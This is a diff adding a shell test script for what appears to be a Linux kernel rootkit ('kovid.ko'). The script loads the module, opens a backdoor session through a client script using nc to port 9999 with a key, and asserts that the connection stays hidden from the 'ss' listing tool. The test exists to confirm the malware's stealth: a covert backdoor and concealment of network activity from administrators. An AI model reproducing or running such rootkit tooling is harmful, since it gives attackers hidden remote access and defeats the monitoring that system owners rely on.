@@ -1,0 +1,46 @@
+# REQUIRES: DEBUG_ONLY
+# REQUIRES: NATIVE_TESTS
+#
+# This test verifies that network connections used by the backdoor (nc, openssl)
+# are hidden from standard connection listing tools like ss.
+#
+# RUN: bash %s > %t.log
+# RUN: FileCheck-18 --input-file=%t.log %s
+
+# Insert the kernel module.
+sudo insmod ../../../build/kovid.ko
+
+###############################################################################
+# Check initial network connections.
+###############################################################################
+
+# Capture the output of ss -tn and verify that there is no visible back-door 
+# listener on port 9999.
+if ss -tn | grep -q ":9999"; then
+    echo "ERROR: Back-door listener visible in ss -tn output before connections"
+else
+    echo "Initial ss -tn output clean"
+fi
+# CHECK: Initial ss -tn output clean
+
+# Start a plain TCP (nc) backdoor connection in the background.
+sudo timeout 30 ../../../scripts/bdclient.sh nc localhost 9999 0x7d3b1cb572f16425 &
+
+###############################################################################
+# Verify that backdoor network connections remain hidden.
+###############################################################################
+
+# Check the current network connections. The hidden backdoor connections
+# should not appear in the output (i.e. no lines should include ":9999").
+if ss -tn | grep -q ":9999"; then
+    echo "ERROR: Hidden back-door connection visible in ss -tn output after connections"
+else
+    echo "Hidden back-door connections are not visible in ss -tn output"
+fi
+# CHECK: Hidden back-door connections are not visible in ss -tn output
+
+# Wait for the background backdoor connection processes to finish.
+wait
+
+sudo rmmod kovid
+sudo dmesg
